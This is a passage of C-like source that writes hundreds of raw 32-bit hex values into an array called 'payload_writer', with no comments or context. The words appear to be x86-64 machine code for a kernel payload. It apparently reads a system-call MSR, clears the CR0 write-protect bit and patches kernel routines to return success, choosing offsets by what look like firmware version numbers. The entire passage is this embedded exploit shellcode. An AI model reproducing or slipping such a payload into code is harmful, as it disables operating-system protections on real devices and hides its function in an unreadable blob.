  payload_writer[575] = 0x850f0824;
  payload_writer[576] = 0x0000009d;
  payload_writer[577] = 0xc148320f;
  payload_writer[578] = 0x84c620e2;
  payload_writer[579] = 0x0000e824;
  payload_writer[580] = 0x09485500;
  payload_writer[581] = 0x2484c6d0;
  payload_writer[582] = 0x000000e9;
  payload_writer[583] = 0x2484c648;
  payload_writer[584] = 0x000000ea;
  payload_writer[585] = 0xa08d4c89;
  payload_writer[586] = 0xffcf14c0;
  payload_writer[587] = 0xeb2484c6;
  payload_writer[588] = 0xe5000000;
  payload_writer[589] = 0x24b48d48;
  payload_writer[590] = 0x000000e8;
  payload_writer[591] = 0xec2484c6;
  payload_writer[592] = 0x53000000;
  payload_writer[593] = 0x50b88d48;
  payload_writer[594] = 0xc600038a;
  payload_writer[595] = 0x00ed2484;
  payload_writer[596] = 0xba480000;
  payload_writer[597] = 0x0000000c;
  payload_writer[598] = 0xee2484c6;
  payload_writer[599] = 0x83000000;
  payload_writer[600] = 0xef2484c6;
  payload_writer[601] = 0xec000000;
  payload_writer[602] = 0xf02484c6;
  payload_writer[603] = 0x58000000;
  payload_writer[604] = 0xf12484c6;
  payload_writer[605] = 0x48000000;
  payload_writer[606] = 0xf22484c6;
  payload_writer[607] = 0x8d000000;
  payload_writer[608] = 0xf32484c6;
  payload_writer[609] = 0x1d000000;
  payload_writer[610] = 0x85d0ff41;
  payload_writer[611] = 0x47850fc0;
  payload_writer[612] = 0x48fffffc;
  payload_writer[613] = 0x382444c7;
  payload_writer[614] = 0x00000406;
  payload_writer[615] = 0x0000e2e9;
  payload_writer[616] = 0x48320f00;
  payload_writer[617] = 0xc620e2c1;
  payload_writer[618] = 0x7f242444;
  payload_writer[619] = 0xc6d00948;
  payload_writer[620] = 0x45252444;
  payload_writer[621] = 0x262444c6;
  payload_writer[622] = 0x748d484c;
  payload_writer[623] = 0x44c62424;
  payload_writer[624] = 0x48462724;
  payload_writer[625] = 0x14d0b88d;
  payload_writer[626] = 0x8948ffcf;
  payload_writer[627] = 0xba08244c;
  payload_writer[628] = 0x00000004;
  payload_writer[629] = 0x4cd0ff41;
  payload_writer[630] = 0x475a058b;
  payload_writer[631] = 0xc0850000;
  payload_writer[632] = 0x244c8b48;
  payload_writer[633] = 0xa5850f08;
  payload_writer[634] = 0x0f000000;
  payload_writer[635] = 0xe2c14832;
  payload_writer[636] = 0x2484c620;
  payload_writer[637] = 0x000000f4;
  payload_writer[638] = 0xd0094855;
  payload_writer[639] = 0xf52484c6;
  payload_writer[640] = 0x48000000;
  payload_writer[641] = 0xf62484c6;
  payload_writer[642] = 0x89000000;
  payload_writer[643] = 0xd0a08d4c;
  payload_writer[644] = 0xc6ffcf14;
  payload_writer[645] = 0x00f72484;
  payload_writer[646] = 0x48e50000;
  payload_writer[647] = 0xf424b48d;
  payload_writer[648] = 0xc6000000;
  payload_writer[649] = 0x00f82484;
  payload_writer[650] = 0x48530000;
  payload_writer[651] = 0x8a50b88d;
  payload_writer[652] = 0x84c60003;
  payload_writer[653] = 0x0000f924;
  payload_writer[654] = 0x0cba4800;
  payload_writer[655] = 0xc6000000;
  payload_writer[656] = 0x00fa2484;
  payload_writer[657] = 0xc6830000;
  payload_writer[658] = 0x00fb2484;
  payload_writer[659] = 0xc6ec0000;
  payload_writer[660] = 0x00fc2484;
  payload_writer[661] = 0xc6580000;
  payload_writer[662] = 0x00fd2484;
  payload_writer[663] = 0xc6480000;
  payload_writer[664] = 0x00fe2484;
  payload_writer[665] = 0xc68d0000;
  payload_writer[666] = 0x00ff2484;
  payload_writer[667] = 0x411d0000;
  payload_writer[668] = 0xc085d0ff;
  payload_writer[669] = 0xfb60850f;
  payload_writer[670] = 0xc748ffff;
  payload_writer[671] = 0x05382444;
  payload_writer[672] = 0x49000004;
  payload_writer[673] = 0x7024848d;
  payload_writer[674] = 0xe900286d;
  payload_writer[675] = 0x000003a8;
  payload_writer[676] = 0x8948320f;
  payload_writer[677] = 0x2444c6d7;
  payload_writer[678] = 0xc1487f28;
  payload_writer[679] = 0x44c620e7;
  payload_writer[680] = 0x48452924;
  payload_writer[681] = 0x44c6f809;
  payload_writer[682] = 0xc64c2a24;
  payload_writer[683] = 0x462b2444;
  payload_writer[684] = 0x24748d48;
  payload_writer[685] = 0x4c894828;
  payload_writer[686] = 0x8d480824;
  payload_writer[687] = 0xcf1600b8;
  payload_writer[688] = 0x0004baff;
  payload_writer[689] = 0xff410000;
  payload_writer[690] = 0x058b4cd0;
  payload_writer[691] = 0x00004668;
  payload_writer[692] = 0x8b48c085;
  payload_writer[693] = 0x0f08244c;
  payload_writer[694] = 0x0000a585;
  payload_writer[695] = 0x48320f00;
  payload_writer[696] = 0xc620e2c1;
  payload_writer[697] = 0x01002484;
  payload_writer[698] = 0x48550000;
  payload_writer[699] = 0x84c6d009;
  payload_writer[700] = 0x00010124;
  payload_writer[701] = 0x84c64800;
  payload_writer[702] = 0x00010224;
  payload_writer[703] = 0x8d4c8900;
  payload_writer[704] = 0xcf1600a0;
  payload_writer[705] = 0x2484c6ff;
  payload_writer[706] = 0x00000103;
  payload_writer[707] = 0xb48d48e5;
  payload_writer[708] = 0x00010024;
  payload_writer[709] = 0x2484c600;
  payload_writer[710] = 0x00000104;
  payload_writer[711] = 0xb88d4853;
  payload_writer[712] = 0x00038a50;
  payload_writer[713] = 0x052484c6;
  payload_writer[714] = 0x48000001;
  payload_writer[715] = 0x00000cba;
  payload_writer[716] = 0x2484c600;
  payload_writer[717] = 0x00000106;
  payload_writer[718] = 0x2484c683;
  payload_writer[719] = 0x00000107;
  payload_writer[720] = 0x2484c6ec;
  payload_writer[721] = 0x00000108;
  payload_writer[722] = 0x2484c658;
  payload_writer[723] = 0x00000109;
  payload_writer[724] = 0x2484c648;
  payload_writer[725] = 0x0000010a;
  payload_writer[726] = 0x2484c68d;
  payload_writer[727] = 0x0000010b;
  payload_writer[728] = 0xd0ff411d;
  payload_writer[729] = 0x850fc085;
  payload_writer[730] = 0xfffffa6e;
  payload_writer[731] = 0x2444c748;
  payload_writer[732] = 0x00040038;
  payload_writer[733] = 0x848d4900;
  payload_writer[734] = 0x286c4024;
  payload_writer[735] = 0x02b6e900;
  payload_writer[736] = 0x320f0000;
  payload_writer[737] = 0x20e2c148;
  payload_writer[738] = 0x2c2444c6;
  payload_writer[739] = 0xd009487f;
  payload_writer[740] = 0x2d2444c6;
  payload_writer[741] = 0x2444c645;
  payload_writer[742] = 0x8d484c2e;
  payload_writer[743] = 0xc62c2474;
  payload_writer[744] = 0x462f2444;
  payload_writer[745] = 0x00b88d48;
  payload_writer[746] = 0x48ffc5e0;
  payload_writer[747] = 0x08244c89;
  payload_writer[748] = 0x000004ba;
  payload_writer[749] = 0xd0ff4100;
  payload_writer[750] = 0x79058b4c;
  payload_writer[751] = 0x85000045;
  payload_writer[752] = 0x4c8b48c0;
  payload_writer[753] = 0x850f0824;
  payload_writer[754] = 0x00000099;
  payload_writer[755] = 0xc148320f;
  payload_writer[756] = 0x84c620e2;
  payload_writer[757] = 0x00010c24;
  payload_writer[758] = 0x89485500;
  payload_writer[759] = 0x2484c6d3;
  payload_writer[760] = 0x0000010d;
  payload_writer[761] = 0xc3094848;
  payload_writer[762] = 0x0e2484c6;
  payload_writer[763] = 0x89000001;
  payload_writer[764] = 0x0f2484c6;
  payload_writer[765] = 0xe5000001;
  payload_writer[766] = 0x24b48d48;
  payload_writer[767] = 0x0000010c;
  payload_writer[768] = 0x102484c6;
  payload_writer[769] = 0x53000001;
  payload_writer[770] = 0x20bb8d48;
  payload_writer[771] = 0xc6ffe3d6;
  payload_writer[772] = 0x01112484;
  payload_writer[773] = 0xba480000;
  payload_writer[774] = 0x0000000c;
  payload_writer[775] = 0x122484c6;
  payload_writer[776] = 0x83000001;
  payload_writer[777] = 0x132484c6;
  payload_writer[778] = 0xec000001;
  payload_writer[779] = 0x142484c6;
  payload_writer[780] = 0x58000001;
  payload_writer[781] = 0x152484c6;
  payload_writer[782] = 0x48000001;
  payload_writer[783] = 0x162484c6;
  payload_writer[784] = 0x8d000001;
  payload_writer[785] = 0x172484c6;
  payload_writer[786] = 0x1d000001;
  payload_writer[787] = 0x85d0ff41;
  payload_writer[788] = 0x83850fc0;
  payload_writer[789] = 0x48fffff9;
  payload_writer[790] = 0x382444c7;
  payload_writer[791] = 0x00000370;
  payload_writer[792] = 0x0001cce9;
  payload_writer[793] = 0x48320f00;
  payload_writer[794] = 0x44c6d789;
  payload_writer[795] = 0x487f3024;
  payload_writer[796] = 0xc620e7c1;
  payload_writer[797] = 0x45312444;
  payload_writer[798] = 0xc6f80948;
  payload_writer[799] = 0x4c322444;
  payload_writer[800] = 0x332444c6;
  payload_writer[801] = 0x748d4846;
  payload_writer[802] = 0x89483024;
  payload_writer[803] = 0x4808244c;
  payload_writer[804] = 0xe0f0b88d;
  payload_writer[805] = 0x04baffc5;
  payload_writer[806] = 0x41000000;
  payload_writer[807] = 0x8b4cd0ff;
  payload_writer[808] = 0x00449305;
  payload_writer[809] = 0x48c08500;
  payload_writer[810] = 0x08244c8b;
  payload_writer[811] = 0x00a4850f;
  payload_writer[812] = 0x320f0000;
  payload_writer[813] = 0x20e2c148;
  payload_writer[814] = 0x182484c6;
  payload_writer[815] = 0x55000001;
  payload_writer[816] = 0xc6d00948;
  payload_writer[817] = 0x01192484;
  payload_writer[818] = 0x48480000;
  payload_writer[819] = 0xe0f0988d;
  payload_writer[820] = 0x84c6ffc5;
  payload_writer[821] = 0x00011a24;
  payload_writer[822] = 0x84c68900;
  payload_writer[823] = 0x00011b24;
  payload_writer[824] = 0x8d48e500;
  payload_writer[825] = 0x011824b4;
  payload_writer[826] = 0x84c60000;
  payload_writer[827] = 0x00011c24;
  payload_writer[828] = 0x8d485300;
  payload_writer[829] = 0x1df550bb;
  payload_writer[830] = 0x2484c600;
  payload_writer[831] = 0x0000011d;
  payload_writer[832] = 0x000cba48;
  payload_writer[833] = 0x84c60000;
  payload_writer[834] = 0x00011e24;
  payload_writer[835] = 0x84c68300;
  payload_writer[836] = 0x00011f24;
  payload_writer[837] = 0x84c6ec00;
  payload_writer[838] = 0x00012024;
  payload_writer[839] = 0x84c65800;
  payload_writer[840] = 0x00012124;
  payload_writer[841] = 0x84c64800;
  payload_writer[842] = 0x00012224;
  payload_writer[843] = 0x84c68d00;
  payload_writer[844] = 0x00012324;
  payload_writer[845] = 0xff411d00;
  payload_writer[846] = 0x0fc085d0;
  payload_writer[847] = 0xfff89985;
  payload_writer[848] = 0x44c748ff;
  payload_writer[849] = 0x03553824;
  payload_writer[850] = 0x8d480000;
  payload_writer[851] = 0x3b966083;
  payload_writer[852] = 0x00e2e900;
  payload_writer[853] = 0x320f0000;
  payload_writer[854] = 0x20e2c148;
  payload_writer[855] = 0x342444c6;
  payload_writer[856] = 0xd009487f;
  payload_writer[857] = 0x352444c6;
  payload_writer[858] = 0x2444c645;
  payload_writer[859] = 0x04ba4c36;
  payload_writer[860] = 0xc6000000;
  payload_writer[861] = 0x46372444;
  payload_writer[862] = 0x24748d48;
  payload_writer[863] = 0xb88d4834;
  payload_writer[864] = 0xffc5e530;
  payload_writer[865] = 0x83d0ff41;
  payload_writer[866] = 0xc085ffca;
  payload_writer[867] = 0x00bb850f;
  payload_writer[868] = 0x82b90000;
  payload_writer[869] = 0xc6c00000;
  payload_writer[870] = 0x01242484;
  payload_writer[871] = 0x0f550000;
  payload_writer[872] = 0xd1894832;
  payload_writer[873] = 0x252484c6;
  payload_writer[874] = 0x48000001;
  payload_writer[875] = 0x20e1c148;
  payload_writer[876] = 0x262484c6;
  payload_writer[877] = 0x89000001;
  payload_writer[878] = 0xc6cb8948;
  payload_writer[879] = 0x01272484;
  payload_writer[880] = 0x48e50000;
  payload_writer[881] = 0x84c6c309;
  payload_writer[882] = 0x00012824;
  payload_writer[883] = 0x84c65300;
  payload_writer[884] = 0x00012924;
  payload_writer[885] = 0x8d484800;
  payload_writer[886] = 0x012424b4;
  payload_writer[887] = 0x84c60000;
  payload_writer[888] = 0x00012a24;
  payload_writer[889] = 0x8d488300;
  payload_writer[890] = 0xe3d940bb;
  payload_writer[891] = 0x2484c6ff;
  payload_writer[892] = 0x0000012b;
  payload_writer[893] = 0x000cbaec;
  payload_writer[894] = 0x84c60000;
  payload_writer[895] = 0x00012c24;
  payload_writer[896] = 0x84c65800;
  payload_writer[897] = 0x00012d24;
  payload_writer[898] = 0x84c64800;
  payload_writer[899] = 0x00012e24;
  payload_writer[900] = 0x84c68d00;
  payload_writer[901] = 0x00012f24;
  payload_writer[902] = 0x15ff1d00;
  payload_writer[903] = 0x00004318;
  payload_writer[904] = 0x850fc085;
  payload_writer[905] = 0xfffff7b2;
  payload_writer[906] = 0x2444c748;
  payload_writer[907] = 0x00035038;
  payload_writer[908] = 0x838d4800;
  payload_writer[909] = 0x00017750;
  payload_writer[910] = 0x084d8b48;
  payload_writer[911] = 0x000008ba;
  payload_writer[912] = 0x7c8d4800;
  payload_writer[913] = 0x8b483824;
  payload_writer[914] = 0x31d0ff31;
  payload_writer[915] = 0xc48148d2;
  payload_writer[916] = 0x00000130;
  payload_writer[917] = 0x5d5bd089;
  payload_writer[918] = 0x55c35c41;
  payload_writer[919] = 0x478b4853;
  payload_writer[920] = 0x488b4c08;
  payload_writer[921] = 0x408b4c48;
  payload_writer[922] = 0x468b4840;
  payload_writer[923] = 0x108b4808;
  payload_writer[924] = 0x50fa8148;
  payload_writer[925] = 0x75000003;
  payload_writer[926] = 0x0082b940;
  payload_writer[927] = 0x320fc000;
  payload_writer[928] = 0x20e2c148;
  payload_writer[929] = 0x48d18948;
  payload_writer[930] = 0x8d48c109;
  payload_writer[931] = 0xc5e530a9;
  payload_writer[932] = 0x998d48ff;
  payload_writer[933] = 0x00b53f30;
  payload_writer[934] = 0x30b18d48;
  payload_writer[935] = 0x4c015c15;
  payload_writer[936] = 0x4bf09d8d;
  payload_writer[937] = 0x8d4c0039;
  payload_writer[938] = 0x394c0095;
  payload_writer[939] = 0x858d4800;
  payload_writer[940] = 0x0034af55;
  payload_writer[941] = 0x000489e9;
  payload_writer[942] = 0xfa814800;
  payload_writer[943] = 0x00000355;
  payload_writer[944] = 0x82b94075;
  payload_writer[945] = 0x0fc00000;
  payload_writer[946] = 0xe2c14832;
  payload_writer[947] = 0xd1894820;
  payload_writer[948] = 0x48c10948;
  payload_writer[949] = 0xe0f0a98d;
  payload_writer[950] = 0x8d48ffc5;
  payload_writer[951] = 0xb53af099;
  payload_writer[952] = 0xb18d4800;
  payload_writer[953] = 0x015c1130;
  payload_writer[954] = 0x209d8d4c;
  payload_writer[955] = 0x4c003950;
  payload_writer[956] = 0x5030958d;
  payload_writer[957] = 0x8d480039;
  payload_writer[958] = 0x34b38585;
  payload_writer[959] = 0x0440e900;
  payload_writer[960] = 0x81480000;
  payload_writer[961] = 0x000370fa;
  payload_writer[962] = 0xb9407500;
  payload_writer[963] = 0xc0000082;
  payload_writer[964] = 0xc148320f;
  payload_writer[965] = 0x894820e2;
  payload_writer[966] = 0xc10948d1;
  payload_writer[967] = 0x00a98d48;
  payload_writer[968] = 0x48ffc5e0;
  payload_writer[969] = 0xcf10998d;
  payload_writer[970] = 0x8d4800b5;
  payload_writer[971] = 0x5cd040b1;
  payload_writer[972] = 0x9d8d4c01;
  payload_writer[973] = 0x003950f0;
  payload_writer[974] = 0x00958d4c;
  payload_writer[975] = 0x48003951;
  payload_writer[976] = 0xb455858d;
  payload_writer[977] = 0xf7e90034;
  payload_writer[978] = 0x48000003;
  payload_writer[979] = 0x0400fa81;
  payload_writer[980] = 0x1e750000;
  payload_writer[981] = 0x000082b9;
  payload_writer[982] = 0x48320fc0;
  payload_writer[983] = 0x4820e2c1;
  payload_writer[984] = 0x8d48d009;
  payload_writer[985] = 0xc1761098;
  payload_writer[986] = 0xb08d4800;
  payload_writer[987] = 0x01d5e850;
  payload_writer[988] = 0x814825eb;
  payload_writer[989] = 0x000405fa;
  payload_writer[990] = 0xb9357500;
  payload_writer[991] = 0xc0000082;
  payload_writer[992] = 0xc148320f;
  payload_writer[993] = 0x094820e2;
  payload_writer[994] = 0x988d48d0;
  payload_writer[995] = 0x00c174e0;
  payload_writer[996] = 0x20b08d48;
  payload_writer[997] = 0x4c01d5e7;
  payload_writer[998] = 0x1ac0988d;
  payload_writer[999] = 0x8d4c0005;
  payload_writer[1000] = 0x051ad090;
  payload_writer[1001] = 0x07054800;
  payload_writer[1002] = 0xe9000103;
  payload_writer[1003] = 0x00000392;
  payload_writer[1004] = 0x06fa8148;
  payload_writer[1005] = 0x75000004;
  payload_writer[1006] = 0x0082b91e;
  payload_writer[1007] = 0x320fc000;
  payload_writer[1008] = 0x20e2c148;
  payload_writer[1009] = 0x48d00948;
  payload_writer[1010] = 0x74d0988d;
  payload_writer[1011] = 0x8d4800c1;
  payload_writer[1012] = 0xd5e710b0;
  payload_writer[1013] = 0x48c0eb01;
  payload_writer[1014] = 0x0407fa81;
  payload_writer[1015] = 0x1e750000;
  payload_writer[1016] = 0x000082b9;
  payload_writer[1017] = 0x48320fc0;
  payload_writer[1018] = 0x4820e2c1;
  payload_writer[1019] = 0x8d48d009;
  payload_writer[1020] = 0xc1b4d098;
  payload_writer[1021] = 0xb08d4800;
  payload_writer[1022] = 0x01d62710;
  payload_writer[1023] = 0x814899eb;
  payload_writer[1024] = 0x000450fa;
  payload_writer[1025] = 0xb9407500;
  payload_writer[1026] = 0xc0000082;
  payload_writer[1027] = 0xc148320f;
  payload_writer[1028] = 0x894820e2;
  payload_writer[1029] = 0xc10948d1;
  payload_writer[1030] = 0x30a98d48;
  payload_writer[1031] = 0x48ffcf6a;
  payload_writer[1032] = 0x03e0998d;
  payload_writer[1033] = 0x8d4800d3;
  payload_writer[1034] = 0xea6460b1;
  payload_writer[1035] = 0x9d8d4c01;
  payload_writer[1036] = 0x0016a5b0;
  payload_writer[1037] = 0xc0958d4c;
  payload_writer[1038] = 0x480016a5;
  payload_writer[1039] = 0x3be7858d;
  payload_writer[1040] = 0xfbe90014;
  payload_writer[1041] = 0x48000002;
  payload_writer[1042] = 0x0470fa81;
  payload_writer[1043] = 0x28750000;
  payload_writer[1044] = 0x000082b9;
  payload_writer[1045] = 0x48320fc0;
  payload_writer[1046] = 0x4820e2c1;
  payload_writer[1047] = 0x0948d189;
  payload_writer[1048] = 0xa98d48c1;
  payload_writer[1049] = 0xffcf47c0;
  payload_writer[1050] = 0x70998d48;
  payload_writer[1051] = 0x4800d372;
  payload_writer[1052] = 0xd1a0b18d;
  payload_writer[1053] = 0x2feb01ea;
  payload_writer[1054] = 0x71fa8148;
  payload_writer[1055] = 0x75000004;
  payload_writer[1056] = 0x0082b940;
  payload_writer[1057] = 0x320fc000;
  payload_writer[1058] = 0x20e2c148;
  payload_writer[1059] = 0x48d18948;
  payload_writer[1060] = 0x8d48c109;
  payload_writer[1061] = 0xcf4830a9;
  payload_writer[1062] = 0x998d48ff;
  payload_writer[1063] = 0x00d372e0;
  payload_writer[1064] = 0x10b18d48;
  payload_writer[1065] = 0x4c01ead2;
  payload_writer[1066] = 0x98109d8d;
  payload_writer[1067] = 0x8d4c0016;
  payload_writer[1068] = 0x16982095;
  payload_writer[1069] = 0x858d4800;
  payload_writer[1070] = 0x00143277;
  payload_writer[1071] = 0x000281e9;
  payload_writer[1072] = 0xfa814800;
  payload_writer[1073] = 0x00000500;
  payload_writer[1074] = 0x82b93575;
  payload_writer[1075] = 0x0fc00000;
  payload_writer[1076] = 0xe2c14832;
  payload_writer[1077] = 0xd0094820;
  payload_writer[1078] = 0xe0988d48;
  payload_writer[1079] = 0x48010984;
  payload_writer[1080] = 0x1830b08d;
  payload_writer[1081] = 0x8d4c022c;
  payload_writer[1082] = 0x0115f098;
  payload_writer[1083] = 0x908d4c00;
  payload_writer[1084] = 0x00011600;
  payload_writer[1085] = 0xed6f0548;
  payload_writer[1086] = 0x43e90013;
  payload_writer[1087] = 0x48000002;
  payload_writer[1088] = 0x0503fa81;
  payload_writer[1089] = 0x10750000;
  payload_writer[1090] = 0x000082b9;
  payload_writer[1091] = 0x48320fc0;
  payload_writer[1092] = 0xc148d189;
  payload_writer[1093] = 0x17eb20e1;
  payload_writer[1094] = 0x05fa8148;
  payload_writer[1095] = 0x75000005;
  payload_writer[1096] = 0x0082b938;
  payload_writer[1097] = 0x320fc000;
  payload_writer[1098] = 0x20e2c148;
  payload_writer[1099] = 0x48d18948;
  payload_writer[1100] = 0x8d48c809;
  payload_writer[1101] = 0x0984e098;
  payload_writer[1102] = 0xb08d4801;
  payload_writer[1103] = 0x022c18b0;
  payload_writer[1104] = 0xf0988d4c;
  payload_writer[1105] = 0x4c000115;
  payload_writer[1106] = 0x1600908d;
  payload_writer[1107] = 0x05480001;
  payload_writer[1108] = 0x0013ee7f;
  payload_writer[1109] = 0x0001e9e9;
  payload_writer[1110] = 0xfa814800;
  payload_writer[1111] = 0x00000550;
  payload_writer[1112] = 0x82b93875;
  payload_writer[1113] = 0x0fc00000;
  payload_writer[1114] = 0xd1894832;
  payload_writer[1115] = 0x20e1c148;
  payload_writer[1116] = 0x48c80948;
  payload_writer[1117] = 0x3fc0988d;
  payload_writer[1118] = 0x8d480113;
  payload_writer[1119] = 0x2ef3b0b0;
  payload_writer[1120] = 0x988d4c02;
  payload_writer[1121] = 0x001b47d0;
  payload_writer[1122] = 0xe0908d4c;
  payload_writer[1123] = 0x48001b47;
  payload_writer[1124] = 0x3c3dfd05;
  payload_writer[1125] = 0x01a8e900;
  payload_writer[1126] = 0x81480000;
  payload_writer[1127] = 0x000553fa;
  payload_writer[1128] = 0xb9357500;
  payload_writer[1129] = 0xc0000082;
  payload_writer[1130] = 0xc148320f;
  payload_writer[1131] = 0x094820e2;
  payload_writer[1132] = 0x988d48d0;
  payload_writer[1133] = 0x01133fc0;
  payload_writer[1134] = 0xb0b08d48;
  payload_writer[1135] = 0x4c022ef3;
  payload_writer[1136] = 0x46d0988d;
  payload_writer[1137] = 0x8d4c001b;
  payload_writer[1138] = 0x1b46e090;
  payload_writer[1139] = 0xfd054800;
  payload_writer[1140] = 0xe9003c3c;
  payload_writer[1141] = 0x0000016a;
  payload_writer[1142] = 0x55fa8148;
  payload_writer[1143] = 0x75000005;
  payload_writer[1144] = 0x0082b938;
  payload_writer[1145] = 0x320fc000;
  payload_writer[1146] = 0x48d18948;
  payload_writer[1147] = 0x4820e1c1;
  payload_writer[1148] = 0x8d48c809;
  payload_writer[1149] = 0x138fc098;
  payload_writer[1150] = 0xb08d4801;
  payload_writer[1151] = 0x022f33b0;
  payload_writer[1152] = 0x40988d4c;
  payload_writer[1153] = 0x4c001b4a;
  payload_writer[1154] = 0x4a50908d;
  payload_writer[1155] = 0x0548001b;
  payload_writer[1156] = 0x003c40bd;
  payload_writer[1157] = 0x000129e9;
  payload_writer[1158] = 0xfa814800;
  payload_writer[1159] = 0x00000600;
  payload_writer[1160] = 0x82b92c75;
  payload_writer[1161] = 0x0fc00000;
  payload_writer[1162] = 0xe2c14832;
  payload_writer[1163] = 0xd0094820;
  payload_writer[1164] = 0x98988d48;
  payload_writer[1165] = 0x48011392;
  payload_writer[1166] = 0xf900b08d;
  payload_writer[1167] = 0x8d4c021b;
  payload_writer[1168] = 0x4592d098;
  payload_writer[1169] = 0x908d4c00;
  payload_writer[1170] = 0x004592e0;
  payload_writer[1171] = 0x814836eb;
  payload_writer[1172] = 0x000620fa;
  payload_writer[1173] = 0xb9387500;
  payload_writer[1174] = 0xc0000082;
  payload_writer[1175] = 0x8948320f;
  payload_writer[1176] = 0xe1c148d1;
  payload_writer[1177] = 0xc8094820;
  payload_writer[1178] = 0x98988d48;
  payload_writer[1179] = 0x480113d2;
  payload_writer[1180] = 0x3900b08d;
  payload_writer[1181] = 0x8d4c021c;
  payload_writer[1182] = 0x4592f098;
  payload_writer[1183] = 0x908d4c00;
  payload_writer[1184] = 0x00459300;
  payload_writer[1185] = 0x1ee70548;
  payload_writer[1186] = 0xb3e90024;
  payload_writer[1187] = 0x48000000;
  payload_writer[1188] = 0x0650fa81;
  payload_writer[1189] = 0x2c750000;
  payload_writer[1190] = 0x000082b9;
  payload_writer[1191] = 0x48320fc0;
  payload_writer[1192] = 0x4820e2c1;
  payload_writer[1193] = 0x8d48d009;
  payload_writer[1194] = 0x13d33898;
  payload_writer[1195] = 0xb08d4801;
  payload_writer[1196] = 0x02300160;
  payload_writer[1197] = 0xd0988d4c;
  payload_writer[1198] = 0x4c002336;
  payload_writer[1199] = 0x36e0908d;
  payload_writer[1200] = 0x36eb0023;
  payload_writer[1201] = 0x70fa8148;
  payload_writer[1202] = 0x75000006;
  payload_writer[1203] = 0x0082b935;
  payload_writer[1204] = 0x320fc000;
  payload_writer[1205] = 0x48d18948;
  payload_writer[1206] = 0x4820e1c1;
  payload_writer[1207] = 0x8d48c809;
  payload_writer[1208] = 0x13e35898;
  payload_writer[1209] = 0xb08d4801;
  payload_writer[1210] = 0x02300160;
  payload_writer[1211] = 0x80988d4c;
  payload_writer[1212] = 0x4c00233a;
  payload_writer[1213] = 0x3a90908d;
  payload_writer[1214] = 0x05480023;
  payload_writer[1215] = 0x000ad124;
  payload_writer[1216] = 0xc88340eb;
  payload_writer[1217] = 0xfa8148ff;
  payload_writer[1218] = 0x00000700;
  payload_writer[1219] = 0x00ee850f;
  payload_writer[1220] = 0x82b90000;
  payload_writer[1221] = 0x0fc00000;
  payload_writer[1222] = 0xe2c14832;
  payload_writer[1223] = 0xd0094820;
  payload_writer[1224] = 0xd8988d48;
  payload_writer[1225] = 0x480113e1;
  payload_writer[1226] = 0x5590b08d;
  payload_writer[1227] = 0x8d4c022c;
  payload_writer[1228] = 0x1cb73098;
  payload_writer[1229] = 0x908d4c00;
  payload_writer[1230] = 0x001cb750;
  payload_writer[1231] = 0x3efb0548;
  payload_writer[1232] = 0x8b49001d;
  payload_writer[1233] = 0x00011890;
  payload_writer[1234] = 0x40c74100;
  payload_writer[1235] = 0x00000004;
  payload_writer[1236] = 0x40c74100;
  payload_writer[1237] = 0x00000008;
  payload_writer[1238] = 0x40c74100;
  payload_writer[1239] = 0x00000014;
  payload_writer[1240] = 0x0002c700;
  payload_writer[1241] = 0x48000000;
  payload_writer[1242] = 0x8949138b;
  payload_writer[1243] = 0x8b483050;
  payload_writer[1244] = 0x51894916;
  payload_writer[1245] = 0x51894920;
  payload_writer[1246] = 0x978b4818;
  payload_writer[1247] = 0x00000130;
  payload_writer[1248] = 0x0013bf48;
  payload_writer[1249] = 0x00000000;
  payload_writer[1250] = 0xc7483801;
  payload_writer[1251] = 0xffff6042;
  payload_writer[1252] = 0x8948ffff;
  payload_writer[1253] = 0xc748587a;
  payload_writer[1254] = 0xffff6842;
  payload_writer[1255] = 0x200fffff;
  payload_writer[1256] = 0xd18948c2;
  payload_writer[1257] = 0xffe18148;
  payload_writer[1258] = 0x0ffffeff;
  payload_writer[1259] = 0xc641c122;
  payload_writer[1260] = 0xc641b803;
  payload_writer[1261] = 0x41010143;
  payload_writer[1262] = 0x000243c6;
  payload_writer[1263] = 0x0343c641;
  payload_writer[1264] = 0x43c64100;
  payload_writer[1265] = 0xc6410004;
  payload_writer[1266] = 0x41c30543;
  payload_writer[1267] = 0x41b802c6;
  payload_writer[1268] = 0x010142c6;
  payload_writer[1269] = 0x0242c641;
  payload_writer[1270] = 0x42c64100;
  payload_writer[1271] = 0xc6410003;
  payload_writer[1272] = 0x41000442;
  payload_writer[1273] = 0xc30542c6;
  payload_writer[1274] = 0xc63100c6;
  payload_writer[1275] = 0xc6c00140;
  payload_writer[1276] = 0xc6900240;
  payload_writer[1277] = 0xc6900340;
  payload_writer[1278] = 0x0f900440;
  payload_writer[1279] = 0xc031c222;
  payload_writer[1280] = 0x53c35d5b;
  payload_writer[1281] = 0x48c93145;
  payload_writer[1282] = 0x4110ec83;
  payload_writer[1283] = 0xb9ffc883;
  payload_writer[1284] = 0x00001002;
  payload_writer[1285] = 0x000003ba;
  payload_writer[1286] = 0x0008be00;
  payload_writer[1287] = 0xff310000;
  payload_writer[1288] = 0x2404c748;
  payload_writer[1289] = 0x00000666;
  payload_writer[1290] = 0x001d69e8;
  payload_writer[1291] = 0x748d4800;
  payload_writer[1292] = 0x8d480824;
  payload_writer[1293] = 0xffebcc3d;
  payload_writer[1294] = 0xc38948ff;
  payload_writer[1295] = 0x24448948;
  payload_writer[1296] = 0x085be808;
  payload_writer[1297] = 0x89480000;
  payload_writer[1298] = 0xde8948e7;
  payload_writer[1299] = 0x000008ba;
  payload_writer[1300] = 0x2115ff00;
  payload_writer[1301] = 0x4800003c;
  payload_writer[1302] = 0x08bedf89;
  payload_writer[1303] = 0xe8000000;
  payload_writer[1304] = 0x00001d3e;
  payload_writer[1305] = 0x24048b48;
  payload_writer[1306] = 0x10c48348;
  payload_writer[1307] = 0x8348c35b;
  payload_writer[1308] = 0x894818ec;
  payload_writer[1309] = 0x4808247c;
  payload_writer[1310] = 0x0824748d;
  payload_writer[1311] = 0xd83d8d48;
  payload_writer[1312] = 0xe8fffff9;
  payload_writer[1313] = 0x00000819;
  payload_writer[1314] = 0x8348c031;
  payload_writer[1315] = 0x41c318c4;
  payload_writer[1316] = 0x31535554;
  payload_writer[1317] = 0xec8148db;
  payload_writer[1318] = 0x00000100;
  payload_writer[1319] = 0x83e58948;
  payload_writer[1320] = 0x0037ba3d;
  payload_writer[1321] = 0x59740000;
  payload_writer[1322] = 0x37d13d80;
  payload_writer[1323] = 0x74000000;
  payload_writer[1324] = 0xffff3141;
  payload_writer[1325] = 0x003cef15;
  payload_writer[1326] = 0xc2894800;
  payload_writer[1327] = 0x48c48949;
  payload_writer[1328] = 0x39be0563;
